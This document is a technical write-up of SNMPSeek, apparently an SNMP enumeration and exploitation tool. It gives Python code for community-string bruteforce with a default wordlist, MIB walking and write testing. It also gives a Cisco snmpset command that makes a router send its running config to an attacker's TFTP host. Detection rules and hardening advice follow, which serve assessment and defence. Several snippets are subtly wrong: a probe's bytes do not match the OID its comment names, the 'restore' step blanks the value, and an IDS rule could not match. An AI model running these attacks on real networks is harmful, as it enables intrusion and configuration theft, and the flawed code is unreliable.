# SNMPSeek Technical Summary

## Overview
SNMPSeek is a comprehensive SNMP enumeration and exploitation tool designed for penetration testing and security assessments. It discovers SNMP-enabled devices, bruteforces community strings, extracts device information via MIB walking, and tests for writable SNMP configurations.

## Architecture

### Core Components
1. **UDP Port Scanner**: Detects SNMP services on UDP port 161
2. **Community String Tester**: Bruteforces authentication
3. **MIB Walker**: Extracts device information via OID queries
4. **Write Tester**: Identifies writable SNMP configurations
5. **Information Extractor**: Parses and categorizes device data

### SNMP Protocol Stack
```
Application:    Management Application (SNMPSeek)
                ↓
SNMP:          PDUs (GET, GETNEXT, SET, TRAP)
                ↓
Encoding:      ASN.1 / BER encoding
                ↓
Transport:     UDP (port 161 queries, 162 traps)
                ↓
Network:       IP
```

## SNMP Protocol Details

### Protocol Versions

**SNMPv1** (RFC 1157):
- Community-based authentication
- No encryption
- Limited error handling
- Most common in legacy systems

**SNMPv2c** (RFC 1901-1908):
- Community-based authentication
- Improved error handling
- Bulk operations (GETBULK)
- Most widely deployed

**SNMPv3** (RFC 3411-3418):
- User-based authentication
- Message encryption (DES, AES)
- Message integrity (MD5, SHA)
- Most secure, less common

### PDU Types
```python
PDU_TYPES = {
    0: 'GetRequest',       # Retrieve value
    1: 'GetNextRequest',   # Retrieve next value
    2: 'GetResponse',      # Response to GET
    3: 'SetRequest',       # Modify value
    4: 'Trap',             # Asynchronous notification
    5: 'GetBulkRequest'    # Bulk retrieval (v2c)
}
```

### Message Format (SNMPv1/v2c)
```
SNMP Message:
├── Version (0=v1, 1=v2c, 3=v3)
├── Community String (plaintext password)
└── PDU
    ├── PDU Type
    ├── Request ID
    ├── Error Status
    ├── Error Index
    └── Variable Bindings
        ├── OID 1 → Value 1
        ├── OID 2 → Value 2
        └── ...
```

## Implementation Details

### UDP Port Scanning
```python
def check_snmp_port(ip, port=161, timeout=2):
    """
    Send minimal SNMP GET request
    Check for valid response
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    
    # Minimal SNMP v1 GET request for sysDescr
    snmp_request = bytes([
        0x30, 0x26,  # SEQUENCE, length 38
        0x02, 0x01, 0x00,  # INTEGER: version (0=v1)
        0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63,  # OCTET STRING: "public"
        0xa0, 0x19,  # GetRequest PDU
        0x02, 0x04, 0x00, 0x00, 0x00, 0x00,  # Request ID
        0x02, 0x01, 0x00,  # Error status: 0
        0x02, 0x01, 0x00,  # Error index: 0
        0x30, 0x0b,  # Variable bindings
        0x30, 0x09,  # Varbind
        0x06, 0x05, 0x2b, 0x06, 0x01, 0x02, 0x01,  # OID: 1.3.6.1.2.1.1.1.0
        0x05, 0x00   # NULL
    ])
    
    sock.sendto(snmp_request, (ip, port))
    data, addr = sock.recvfrom(1024)
    sock.close()
    
    return len(data) > 0
```

**Response Validation**:
- Valid SNMP: Response received
- No SNMP: Timeout or ICMP unreachable
- Filtered: No response (firewall)

### Community String Testing
```python
def test_community_string(ip, community, timeout=3):
    """
    Test community string via snmpget
    """
    # Test read access with sysDescr OID
    cmd = [
        'snmpget',
        '-v2c',                          # SNMP version 2c
        '-c', community,                 # Community string
        '-t', str(timeout),              # Timeout
        ip,                              # Target IP
        '1.3.6.1.2.1.1.1.0'             # OID: sysDescr
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0 and 'Timeout' not in result.stdout:
        return {'valid': True, 'readable': True}
    
    return {'valid': False}
```

**Community String Dictionary**:
```python
COMMON_COMMUNITY_STRINGS = [
    'public',      # Default read-only
    'private',     # Default read-write
    'community',   # Common alternative
    'snmp',        # Generic
    'manager',     # Management
    'admin',       # Administrative
    'cisco',       # Vendor-specific (Cisco)
    'password',    # Weak default
    'secret',      # Another weak default
    'default',     # Self-explanatory
    'read',        # Descriptive
    'write',       # Descriptive
    'monitor',     # Monitoring tools
    'network',     # Network-specific
    'switch',      # Device-specific
    'router'       # Device-specific
]
```

### MIB Walking
```python
def snmp_walk(ip, community, oid, timeout=5):
    """
    Perform SNMP walk starting at OID
    Returns list of (oid, value) tuples
    """
    results = []
    
    cmd = [
        'snmpwalk',
        '-v2c',
        '-c', community,
        '-t', str(timeout),
        '-Oq',              # Quick output (OID value only)
        ip,
        oid
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        for line in result.stdout.split('\n'):
            if line.strip():
                # Parse: OID value
                parts = line.split(' ', 1)
                if len(parts) == 2:
                    results.append((parts[0], parts[1].strip().strip('"')))
    
    return results
```

**Walk Algorithm**:
1. Send GETNEXT for starting OID
2. Receive OID + value in response
3. Send GETNEXT for received OID
4. Repeat until OID prefix changes (end of subtree)

### Write Access Testing
```python
def test_writable_snmp(ip, community, timeout=3):
    """
    Test SNMP write access
    Attempt to set sysContact OID
    """
    # OID: 1.3.6.1.2.1.1.4.0 (sysContact)
    test_value = "SNMPSEEK_TEST"
    
    cmd = [
        'snmpset',
        '-v2c',
        '-c', community,
        '-t', str(timeout),
        ip,
        '1.3.6.1.2.1.1.4.0',  # sysContact OID
        's',                   # Type: string
        test_value
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        # Success: restore original
        restore_cmd = cmd.copy()
        restore_cmd[-1] = ''  # Empty string
        subprocess.run(restore_cmd, capture_output=True)
        return True
    
    return False
```

**Writable OIDs Tested**:
```python
WRITABLE_OIDS = [
    '1.3.6.1.2.1.1.4.0',  # sysContact (usually writable)
    '1.3.6.1.2.1.1.5.0',  # sysName (sometimes writable)
    '1.3.6.1.2.1.1.6.0'   # sysLocation (usually writable)
]
```

## OID Hierarchy

### Standard MIB-II Structure
```
1.3.6.1 (Internet)
└── 2 (mgmt)
    └── 1 (mib-2)
        ├── 1 (system)
        │   ├── 1.0 sysDescr
        │   ├── 2.0 sysObjectID
        │   ├── 3.0 sysUpTime
        │   ├── 4.0 sysContact
        │   ├── 5.0 sysName
        │   ├── 6.0 sysLocation
        │   └── 7.0 sysServices
        ├── 2 (interfaces)
        │   ├── 1.0 ifNumber
        │   └── 2.1.X (ifTable)
        ├── 4 (ip)
        │   ├── 20.1.1 ipAdEntAddr (IP addresses)
        │   ├── 21.1.7 ipRouteNextHop (routes)
        │   └── 22.1.2 ipNetToMediaPhysAddress (ARP)
        └── 25 (host)
            ├── 2.3.1.3 hrStorageDescr
            └── 3.3.1.2 hrProcessorLoad
```

### Vendor-Specific (Enterprise OIDs)
```
1.3.6.1.4.1 (enterprises)
├── 9 (Cisco)
│   ├── 2.1.53 Cisco running config
│   ├── 2.1.55 Cisco enable password (hashed)
│   └── 9.23.1.2 CDP neighbors
├── 77 (Microsoft)
│   ├── 1.2.25 Windows users
│   └── 1.4.2 Windows shares
├── 2021 (Net-SNMP)
└── 2636 (Juniper)
```

## Information Extraction

### System Information
```python
COMMON_OIDS = {
    'sysDescr': '1.3.6.1.2.1.1.1.0',      # Device description
    'sysObjectID': '1.3.6.1.2.1.1.2.0',   # Device type identifier
    'sysUpTime': '1.3.6.1.2.1.1.3.0',     # Time since boot (timeticks)
    'sysContact': '1.3.6.1.2.1.1.4.0',    # Admin contact
    'sysName': '1.3.6.1.2.1.1.5.0',       # Hostname
    'sysLocation': '1.3.6.1.2.1.1.6.0',   # Physical location
    'sysServices': '1.3.6.1.2.1.1.7.0'    # Service flags
}
```

**sysServices Decoding**:
```python
# Bitwise flags indicating OSI layer capabilities
# 0x02 (bit 1) = Physical layer
# 0x04 (bit 2) = Datalink/Subnetwork layer
# 0x08 (bit 3) = Internet layer
# 0x40 (bit 6) = Application layer

# Example: 72 (0x48) = 0x08 + 0x40 = Layer 3 (IP) + Layer 7 (Application)
# Likely a router or Layer 3 switch
```

### Network Information Extraction
```python
def extract_network_info(ip, community):
    """Extract network configuration"""
    info = {}
    
    # IP addresses
    ip_addrs = snmp_walk(ip, community, '1.3.6.1.2.1.4.20.1.1')
    info['ip_addresses'] = [addr[1] for addr in ip_addrs]
    
    # Routing table
    routes = snmp_walk(ip, community, '1.3.6.1.2.1.4.21.1.7')
    info['routes'] = routes
    
    # ARP cache
    arp = snmp_walk(ip, community, '1.3.6.1.2.1.4.22.1.2')
    info['arp_cache'] = arp
    
    # Interfaces
    interfaces = snmp_walk(ip, community, '1.3.6.1.2.1.2.2.1.2')
    info['interfaces'] = [iface[1] for iface in interfaces]
    
    return info
```

## Concurrent Execution

### Threading Model
```python
with ThreadPoolExecutor(max_workers=workers) as executor:
    # Submit scan jobs
    futures = {
        executor.submit(scan_host, ip, args): ip
        for ip in targets
    }
    
    # Process results as completed
    for future in as_completed(futures):
        ip = futures[future]
        try:
            result = future.result(timeout=args.timeout * 2)
            # Process findings
        except Exception as e:
            # Handle errors per-host
            log_error(f"Error scanning {ip}: {e}")
```

**Performance Characteristics**:
- UDP scanning inherently slower than TCP
- No SYN-ACK handshake, relies on response
- Timeout waiting crucial for accuracy
- 10 workers default, scalable to 100+

## Output Formats

### snmplist.txt (Discovery)
```
192.168.1.1 - SNMP Open (public)
192.168.1.10 - SNMP Open (private, public)
192.168.1.254 - SNMP Open (community)
```

### snmp_creds.txt (Credentials)
```
192.168.1.1:public:READ
192.168.1.10:private:WRITE
192.168.1.10:public:READ
192.168.1.254:community:READ
```

**Format**: `IP:COMMUNITY:ACCESS_LEVEL`

### snmp_details.json (Structured)
```json
{
  "scan_metadata": {
    "start_time": "2025-10-13T16:00:00Z",
    "end_time": "2025-10-13T16:45:00Z",
    "duration_seconds": 2700,
    "targets_scanned": 254,
    "snmp_found": 12
  },
  "results": [
    {
      "ip": "192.168.1.1",
      "port": 161,
      "communities": [
        {
          "string": "public",
          "access": "READ",
          "writable": false
        }
      ],
      "device_info": {
        "sysName": "router-core-01",
        "sysDescr": "Cisco IOS Software, Version 15.2(4)M",
        "sysLocation": "Server Room A, Rack 3",
        "sysContact": "netadmin@company.com",
        "sysUpTime": "393696000",
        "sysObjectID": "1.3.6.1.4.1.9.1.1",
        "interfaces": ["GigabitEthernet0/0", "GigabitEthernet0/1"],
        "ip_addresses": ["192.168.1.1", "10.0.0.1", "172.16.0.1"]
      },
      "network_info": {
        "routing_table_entries": 145,
        "arp_cache_entries": 234,
        "interface_count": 24
      }
    }
  ]
}
```

## Performance Characteristics

### Timing Analysis
**Per-Host Operations**:
- UDP probe: ~100-500ms (with retries)
- Community test: ~1-3 seconds per string
- Full bruteforce (16 strings): ~15-45 seconds
- MIB walk (system tree): ~5-10 seconds
- Write test: ~2-5 seconds

**Network Scans**:
- /24 (254 hosts, 10 workers): ~5-10 minutes (probe only)
- /24 with bruteforce: ~30-60 minutes
- /16 (65,536 hosts, 100 workers): ~8-16 hours

### Resource Usage
- **Memory**: ~50-150 MB
- **CPU**: Low (I/O bound, waiting on network)
- **Network**: Minimal bandwidth (<1 KB per query)
- **Disk**: Output files typically <10 MB

## Security Implications

### Attack Vectors

**Information Disclosure**:
- Device configurations
- Network topology (IPs, routes, VLANs)
- Running software versions
- User accounts (Windows)
- Network shares (Windows)

**Configuration Modification**:
- Change SNMP community strings
- Modify routing tables
- Alter VLAN configurations
- Change device hostnames/locations
- Disable interfaces

**Cisco-Specific Attacks**:
```bash
# Extract running config via TFTP
# Requires write community string
snmpset -v2c -c private 192.168.1.1 \
    1.3.6.1.4.1.9.9.96.1.1.1.1.2.1 i 1 \
    1.3.6.1.4.1.9.9.96.1.1.1.1.3.1 i 1 \
    1.3.6.1.4.1.9.9.96.1.1.1.1.4.1 a 192.168.1.100 \
    1.3.6.1.4.1.9.9.96.1.1.1.1.5.1 s "config.txt" \
    1.3.6.1.4.1.9.9.96.1.1.1.1.14.1 i 1

# Device uploads config to attacker's TFTP server
```

## Detection & Defense

### Detection Signatures

**Network IDS Rules** (Snort/Suricata):
```
# SNMP community string bruteforce
alert udp any any -> $HOME_NET 161 (
    msg:"SNMP Community String Bruteforce Attempt";
    content:"|04|"; depth:1;  # OCTET STRING
    threshold:type threshold, track by_src, count 5, seconds 10;
    sid:1000001;
)

# SNMP SET request (write operation)
alert udp any any -> $HOME_NET 161 (
    msg:"SNMP SET Request Detected";
    content:"|a3|"; offset:20; depth:1;  # SetRequest PDU
    sid:1000002;
)
```

**SIEM Detection Logic**:
```
# Multiple SNMP queries from single source
source_ip = "192.168.1.100"
dest_port = 161
protocol = UDP
count > 100 within 5 minutes
→ ALERT: Possible SNMP scan

# SNMP authentication failures
message_type = "authenticationFailure"
count > 5 within 1 minute
→ ALERT: SNMP bruteforce attempt
```

### Defense Mechanisms

**Disable SNMP** (if not needed):
```bash
# Linux
systemctl stop snmpd && systemctl disable snmpd

# Windows
Stop-Service SNMP; Set-Service SNMP -StartupType Disabled

# Cisco
conf t
no snmp-server
```

**Strong Community Strings**:
```bash
# Linux /etc/snmp/snmpd.conf
rocommunity "MyC0mpl3x!R34d0nly$tring2024" 10.0.0.0/24

# Cisco
snmp-server community "MyC0mpl3x!Str1ng" RO 10
```

**SNMPv3 with Authentication**:
```bash
# Linux /etc/snmp/snmpd.conf
createUser myuser SHA myauthpassword AES myencryptionpassword
rouser myuser priv

# Query with SNMPv3
snmpget -v3 -l authPriv -u myuser \
    -a SHA -A myauthpassword \
    -x AES -X myencryptionpassword \
    192.168.1.1 1.3.6.1.2.1.1.5.0
```

## Limitations

### Technical Limitations
- UDP protocol (no guaranteed delivery)
- Requires direct IP connectivity
- Cannot bypass properly configured ACLs
- Depends on external tools (snmpwalk, snmpget)
- SNMPv3 support limited

### Scope Limitations
- No automatic exploitation (read-only by default)
- Limited to SNMP-enabled devices
- Cannot crack encrypted SNMPv3 traffic
- No MIB compilation (uses standard OIDs only)

## Dependencies

### Required
- Python 3.6+
- `socket` (standard library)
- `subprocess` (standard library)
- `net-snmp` tools: snmpget, snmpwalk, snmpset

### Optional
- `onesixtyone`: Fast SNMP scanner
- `snmp-check`: Detailed enumeration
- `snmp-mibs-downloader`: MIB database

### Installation
```bash
# Ubuntu/Debian
apt install snmp snmp-mibs-downloader python3

# CentOS/RHEL
yum install net-snmp net-snmp-utils python3

# macOS
brew install net-snmp python3
```

## Future Enhancements
- Native SNMP protocol implementation (remove tool dependencies)
- SNMPv3 username bruteforcing
- MIB compiler integration
- Automated exploitation modules
- SNMP trap listening and analysis
- Real-time device monitoring
- Configuration backup extraction
- SNMP relay/amplification testing

## References
- **RFC 1157**: SNMPv1 Protocol Specification
- **RFC 1905**: SNMPv2c Protocol Operations
- **RFC 3414**: SNMPv3 User-based Security Model
- **RFC 3416**: SNMPv2 Protocol Operations
- **MITRE ATT&CK**: T1602 (Data from Configuration Repository)
- **CWE-15**: External Control of System or Configuration Setting
- **onesixtyone**: https://github.com/trailofbits/onesixtyone
- **Net-SNMP**: http://www.net-snmp.org/
